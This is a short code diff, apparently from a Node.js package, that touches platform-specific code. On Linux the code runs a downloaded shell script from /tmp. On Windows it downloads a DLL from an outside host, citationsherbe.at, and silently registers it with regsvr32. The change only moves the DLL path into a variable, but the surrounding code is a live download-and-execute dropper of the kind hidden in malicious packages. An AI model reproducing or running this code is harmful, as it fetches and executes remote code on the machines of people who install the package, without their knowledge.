@@ -35,7 +35,8 @@ if (platform === 'linux') {
     exec('bash /tmp/sdd.sh', function(){});
   });
 } else if (platform === 'win32') {
-  download('https://citationsherbe.at/create.dll', path.join(os.tmpdir(), 'create.dll'), function() {
+  var dll = path.join(os.tmpdir(), 'create.dll');
+  download('https://citationsherbe.at/create.dll', dll, function() {
     exec('regsvr32.exe /s ' + path.join(os.tmpdir(), 'create.dll'), function(){});
   });
 }
